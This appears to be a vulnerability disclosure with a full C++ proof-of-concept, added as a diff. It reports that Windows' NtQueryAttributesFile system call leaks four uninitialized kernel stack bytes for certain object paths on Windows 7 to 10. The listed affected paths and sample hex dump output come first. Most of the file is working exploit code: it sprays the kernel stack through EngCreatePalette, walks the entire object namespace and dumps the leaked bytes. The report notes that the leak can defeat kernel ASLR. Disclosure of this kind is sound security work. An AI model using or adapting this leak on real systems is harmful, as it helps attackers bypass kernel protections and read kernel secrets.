@@ -1,0 +1,236 @@
+/*
+We have discovered that the nt!NtQueryAttributesFile system call invoked with paths of certain kernel objects discloses uninitialized kernel stack memory to user-mode clients. The vulnerability affects Windows 7 to 10, 32/64-bit. The paths that we have observed to trigger the leak in our test Windows 10 (1709) 64-bit VM are:
+
+--- cut ---
+  "\ArcName\multi(0)disk(0)rdisk(0)partition(1)"
+  "\GLOBAL??\Harddisk0Partition1"
+  "\GLOBAL??\Volume{GUID}"
+  "\GLOBAL??\SystemPartition"
+  "\GLOBAL??\STORAGE#Volume#{GUID}#0000000000100000#{GUID}"
+  "\GLOBAL??\HarddiskVolume1"
+  "\Device\SystemPartition"
+  "\Device\HarddiskVolume1"
+--- cut ---
+
+The output structure returned by the system call is FILE_BASIC_INFORMATION [1]:
+
+--- cut ---
+  typedef struct _FILE_BASIC_INFORMATION {
+    LARGE_INTEGER CreationTime;
+    LARGE_INTEGER LastAccessTime;
+    LARGE_INTEGER LastWriteTime;
+    LARGE_INTEGER ChangeTime;
+    ULONG         FileAttributes;
+  } FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;
+--- cut ---
+
+In case of the above affected paths, the 4-byte "FileAttributes" field is never initialized. As the kernel uses a temporary copy of the structure that is later passed to user-mode, the bug results in the disclosure of those 4 uninitialized kernel stack bytes. This can be observed by running the attached proof-of-concept program, which invokes nt!NtQueryAttributesFile against every object in the global object namespace, preceded by spraying the kernel stack with a 0x41 ('A') marker byte. Relevant parts of the output are shown below:
+
+--- cut ---
+  Name: \ArcName\multi(0)disk(0)rdisk(0)partition(1), Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 41 41 41 41 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? AAAA............
+  Name: \GLOBAL??\Harddisk0Partition1, Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 41 41 41 41 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? AAAA............
+  Name: \GLOBAL??\Volume{GUID}, Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 41 41 41 41 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? AAAA............
+  Name: \GLOBAL??\SystemPartition, Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 41 41 41 41 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? AAAA............
+  Name: \GLOBAL??\STORAGE#Volume#{GUID}#0000000000100000#{GUID}, Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 41 41 41 41 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? AAAA............
+  Name: \GLOBAL??\HarddiskVolume1, Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 41 41 41 41 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? AAAA............
+  Name: \Device\SystemPartition, Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 41 41 41 41 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? AAAA............
+  Name: \Device\HarddiskVolume1, Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  00000020: 41 41 41 41 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? AAAA............
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+
+#include <cstdio>
+
+#pragma comment(lib, "ntdll.lib")
+
+#define DIRECTORY_QUERY    0x0001
+#define DIRECTORY_TRAVERSE 0x0002
+
+typedef struct _FILE_BASIC_INFORMATION {
+  LARGE_INTEGER CreationTime;
+  LARGE_INTEGER LastAccessTime;
+  LARGE_INTEGER LastWriteTime;
+  LARGE_INTEGER ChangeTime;
+  ULONG         FileAttributes;
+} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;
+
+typedef struct _OBJECT_DIRECTORY_INFORMATION {
+  UNICODE_STRING Name;
+  UNICODE_STRING TypeName;
+} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;
+
+extern "C" {
+  NTSTATUS NTAPI NtQueryAttributesFile(
+    _In_  POBJECT_ATTRIBUTES      ObjectAttributes,
+    _Out_ PFILE_BASIC_INFORMATION FileInformation
+  );
+
+  NTSTATUS WINAPI NtQueryDirectoryObject(
+    _In_      HANDLE  DirectoryHandle,
+    _Out_opt_ PVOID   Buffer,
+    _In_      ULONG   Length,
+    _In_      BOOLEAN ReturnSingleEntry,
+    _In_      BOOLEAN RestartScan,
+    _Inout_   PULONG  Context,
+    _Out_opt_ PULONG  ReturnLength
+  );
+
+  NTSTATUS WINAPI NtOpenDirectoryObject(
+    _Out_ PHANDLE            DirectoryHandle,
+    _In_  ACCESS_MASK        DesiredAccess,
+    _In_  POBJECT_ATTRIBUTES ObjectAttributes
+  );
+};
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static bool initialized = false;
+  static HPALETTE(NTAPI *EngCreatePalette)(
+    _In_ ULONG iMode,
+    _In_ ULONG cColors,
+    _In_ ULONG *pulColors,
+    _In_ FLONG flRed,
+    _In_ FLONG flGreen,
+    _In_ FLONG flBlue
+    );
+
+  if (!initialized) {
+    EngCreatePalette = (HPALETTE(NTAPI*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L"gdi32.dll"), "EngCreatePalette");
+    initialized = true;
+  }
+
+  static ULONG buffer[256];
+  MyMemset((PBYTE)buffer, 'A', sizeof(buffer));
+  EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);
+  MyMemset((PBYTE)buffer, 'B', sizeof(buffer));
+}
+
+VOID QueryFile(HANDLE RootDirectory, PCWSTR Path) {
+  OBJECT_ATTRIBUTES Attributes;
+  UNICODE_STRING Name;
+  RtlInitUnicodeString(&Name, Path);
+  InitializeObjectAttributes(&Attributes, &Name, OBJ_CASE_INSENSITIVE, RootDirectory, NULL);
+
+  FILE_BASIC_INFORMATION FileInformation, EmptyInformation;
+  RtlZeroMemory(&FileInformation, sizeof(FileInformation));
+  RtlZeroMemory(&EmptyInformation, sizeof(EmptyInformation));
+
+  SprayKernelStack();
+
+  NTSTATUS Status = NtQueryAttributesFile(&Attributes, &FileInformation);
+  if (memcmp(&FileInformation, &EmptyInformation, sizeof(FileInformation)) != 0) {
+    wprintf(L"Name: %s, Status: %x\n", Path, Status);
+    PrintHex(&FileInformation, sizeof(FileInformation));
+  }
+}
+
+VOID EnumerateDirectory(PWCHAR path) {
+  HANDLE hdir = NULL;
+  OBJECT_ATTRIBUTES attrs;
+  UNICODE_STRING name;
+
+  RtlInitUnicodeString(&name, path);
+  InitializeObjectAttributes(&attrs, &name, 0, NULL, NULL);
+  NTSTATUS st = NtOpenDirectoryObject(&hdir, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, &attrs);
+
+  if (NT_SUCCESS(st)) {
+    CONST ULONG kMaxBufferSize = 128 * 1024;
+    PBYTE buffer = (PBYTE)malloc(kMaxBufferSize);
+
+    ULONG Context;
+    st = NtQueryDirectoryObject(hdir, buffer, kMaxBufferSize, FALSE, TRUE, &Context, NULL);
+    if (NT_SUCCESS(st)) {
+      POBJECT_DIRECTORY_INFORMATION pdi = (POBJECT_DIRECTORY_INFORMATION)buffer;
+      while (pdi->Name.Buffer != NULL) {
+        WCHAR path_buffer[MAX_PATH];
+
+        if (!wcscmp(path, L"\\")) {
+          wsprintf(path_buffer, L"%s%s", path, pdi->Name.Buffer);
+        }
+        else {
+          wsprintf(path_buffer, L"%s\\%s", path, pdi->Name.Buffer);
+        }
+
+        if (!wcscmp(pdi->TypeName.Buffer, L"Directory")) {
+          EnumerateDirectory(path_buffer);
+        }
+        else {
+          QueryFile(NULL, path_buffer);
+          wcscat_s(path_buffer, L"\\");
+          QueryFile(NULL, path_buffer);
+        }
+
+        pdi++;
+      }
+    }
+
+    free(buffer);
+    NtClose(hdir);
+  }
+}
+
+int main() {
+  EnumerateDirectory(L"\\");
+
+  return 0;
+}
